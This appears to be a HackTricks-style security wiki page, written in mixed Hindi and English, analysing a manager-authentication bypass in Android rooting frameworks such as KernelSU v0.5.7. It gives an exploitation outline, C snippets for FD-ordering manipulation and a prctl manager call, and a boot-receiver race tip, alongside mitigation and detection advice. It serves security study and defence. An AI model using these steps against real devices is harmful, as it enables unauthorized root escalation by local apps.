# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

KernelSU, APatch, SKRoot और Magisk जैसे Rooting frameworks अक्सर Linux/Android kernel को patch करते हैं और hooked syscall के माध्यम से unprivileged userspace "manager" app को privileged functionality उपलब्ध कराते हैं। यदि manager-authentication चरण में खामी हो, तो कोई भी local app इस channel तक पहुंच सकता है और पहले से rooted devices पर privileges escalate कर सकता है।

यह पेज public research में सामने आई techniques और pitfalls (विशेष रूप से Zimperium के KernelSU v0.5.7 analysis) को abstract करता है, ताकि red और blue teams attack surfaces, exploitation primitives और robust mitigations को समझ सकें।

---
## Architecture pattern: syscall-hooked manager channel

- Kernel module/patch किसी syscall (आमतौर पर prctl) को hook करता है, ताकि userspace से "commands" प्राप्त की जा सकें।
- Protocol आमतौर पर इस प्रकार होता है: magic_value, command_id, arg_ptr/len ...
- एक userspace manager app पहले authenticate करता है (जैसे, CMD_BECOME_MANAGER)। जब kernel caller को trusted manager के रूप में mark कर देता है, तब privileged commands स्वीकार किए जाते हैं:
- Caller को root प्रदान करना (जैसे, CMD_GRANT_ROOT)
- su के लिए allowlists/deny-lists manage करना
- SELinux policy adjust करना (जैसे, CMD_SET_SEPOLICY)
- Version/configuration query करना
- क्योंकि कोई भी app syscalls invoke कर सकता है, इसलिए manager authentication की correctness critical है।

Example (KernelSU design):
- Hooked syscall: prctl
- KernelSU handler की ओर divert करने के लिए magic value: 0xDEADBEEF
- Commands में शामिल हैं: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, आदि।

---
## KernelSU v0.5.7 authentication flow (as implemented)

जब userspace prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...) call करता है, तो KernelSU निम्नलिखित verify करता है:

1) Path prefix check
- दिया गया path caller UID के expected prefix से शुरू होना चाहिए, जैसे /data/data/<pkg> या /data/user/<id>/<pkg>।
- Reference: core_hook.c (v0.5.7) path prefix logic।

2) Ownership check
- Path का owner caller UID होना चाहिए।
- Reference: core_hook.c (v0.5.7) ownership logic।

3) FD table scan के माध्यम से APK signature check
- Calling process के open file descriptors (FDs) पर iterate करें।
- पहली ऐसी file चुनें जिसका path /data/app/*/base.apk से match करता हो।
- APK v2 signature को parse करें और official manager certificate के विरुद्ध verify करें।
- References: manager.c (iterating FDs), apk_sign.c (APK v2 verification)।

यदि सभी checks pass हो जाते हैं, तो kernel manager के UID को temporarily cache करता है और उस UID से privileged commands स्वीकार करता है, जब तक कि उसे reset न किया जाए।

---
## Vulnerability class: FD iteration से “the first matching APK” पर trust करना

यदि signature check process की FD table में मिले "the first matching /data/app/*/base.apk" से bind है, तो यह वास्तव में caller के अपने package को verify नहीं कर रहा है। कोई attacker legitimately signed APK (वास्तविक manager का) पहले से इस प्रकार position कर सकता है कि वह उनके अपने base.apk से पहले FD list में दिखाई दे।

यह trust-by-indirection किसी unprivileged app को manager की signing key के owner हुए बिना manager का impersonate करने देता है।

Exploited key properties:
- FD scan caller की package identity से bind नहीं होता; यह केवल path strings पर pattern-match करता है।
- open() सबसे कम उपलब्ध FD return करता है। पहले lower-numbered FDs बंद करके attacker ordering को control कर सकता है।
- Filter केवल यह check करता है कि path /data/app/*/base.apk से match करता है—यह नहीं कि वह caller के installed package से संबंधित है।

---
## Attack preconditions

- Device पहले से vulnerable Rooting framework (जैसे, KernelSU v0.5.7) से rooted हो।
- Attacker locally arbitrary unprivileged code (Android app process) चला सके।
- Real manager ने अभी authenticate न किया हो (जैसे, reboot के तुरंत बाद)। कुछ frameworks success के बाद manager UID को cache करते हैं; आपको race जीतनी होगी।

---
## Exploitation outline (KernelSU v0.5.7)

High-level steps:
1) Prefix और ownership checks satisfy करने के लिए अपने app data directory का valid path बनाएं।
2) सुनिश्चित करें कि genuine KernelSU Manager base.apk आपके अपने base.apk से lower-numbered FD पर open हो।
3) Checks pass करने के लिए prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) invoke करें।
4) Elevation को persist करने के लिए CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY जैसे privileged commands issue करें।

Step 2 (FD ordering) पर Practical notes:
- /proc/self/fd symlinks को walk करके अपने process के FD में अपने /data/app/*/base.apk का FD identify करें।
- कोई low FD (जैसे stdin, fd 0) close करें और legitimate manager APK को पहले open करें, ताकि वह fd 0 (या आपके base.apk fd से lower किसी index) पर occupy हो जाए।
- Legitimate manager APK को अपने app के साथ bundle करें, ताकि उसका path kernel के naive filter को satisfy करे। उदाहरण के लिए, उसे /data/app/*/base.apk से match करने वाले subpath के अंतर्गत रखें।

Example code snippets (Android/Linux, illustrative only):

Open FDs में base.apk entries locate करें:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
एक कम-संख्या वाले FD को वास्तविक manager APK की ओर point करने के लिए बाध्य करें:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
prctl hook के माध्यम से Manager authentication:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
सफलता के बाद, privileged commands (उदाहरण):
- CMD_GRANT_ROOT: वर्तमान process को root पर promote करें
- CMD_ALLOW_SU: persistent su के लिए अपने package/UID को allowlist में जोड़ें
- CMD_SET_SEPOLICY: framework द्वारा समर्थित SELinux policy को adjust करें

Race/persistence tip:
- AndroidManifest में BOOT_COMPLETED receiver (RECEIVE_BOOT_COMPLETED) register करें, ताकि reboot के बाद जल्दी start हो और real manager से पहले authentication का प्रयास कर सके।

---
## Detection और mitigation guidance

Framework developers के लिए:
- Authentication को arbitrary FDs से नहीं, बल्कि caller के package/UID से bind करें:
- उसके UID से caller का package resolve करें और FDs scan करने के बजाय PackageManager के माध्यम से installed package के signature से verify करें।
- यदि kernel-only हो, तो stable caller identity (task creds) का उपयोग करें और process FDs के बजाय init/userspace helper द्वारा managed stable source of truth से validate करें।
- Identity के रूप में path-prefix checks से बचें; caller इन्हें आसानी से satisfy कर सकता है।
- Channel पर nonce-based challenge–response का उपयोग करें और boot या key events पर किसी भी cached manager identity को clear करें।
- जब संभव हो, generic syscalls को overload करने के बजाय binder-based authenticated IPC पर विचार करें।

Defenders/blue team के लिए:
- Rooting frameworks और manager processes की presence detect करें; यदि आपके पास kernel telemetry है, तो suspicious magic constants (जैसे 0xDEADBEEF) वाले prctl calls को monitor करें।
- Managed fleets पर untrusted packages के boot receivers को block करें या उन पर alert दें, जो boot के तुरंत बाद तेजी से privileged manager commands का प्रयास करते हैं।
- सुनिश्चित करें कि devices patched framework versions पर updated हों; update के समय cached manager IDs को invalidate करें।

Attack की limitations:
- यह केवल उन devices को प्रभावित करता है जो पहले से ही vulnerable framework से rooted हैं।
- आमतौर पर legitimate manager के authenticate होने से पहले reboot/race window की आवश्यकता होती है (कुछ frameworks reset होने तक manager UID को cache करते हैं)।

---
## Frameworks के बीच संबंधित notes

- Password-based auth (जैसे historical APatch/SKRoot builds) कमजोर हो सकता है, यदि passwords guessable/bruteforceable हों या validations में bugs हों।
- Package/signature-based auth (जैसे KernelSU) सिद्धांत रूप से अधिक मजबूत है, लेकिन इसे indirect artefacts जैसे FD scans के बजाय actual caller से bind करना आवश्यक है।
- Magisk: CVE-2024-48336 (MagiskEoP) ने दिखाया कि mature ecosystems भी identity spoofing के प्रति susceptible हो सकते हैं, जिससे manager context के अंदर root के साथ code execution संभव हो जाता है।

---
## References

- [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [KernelSU project](https://kernelsu.org/)
- [APatch](https://github.com/bmax121/APatch)
- [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
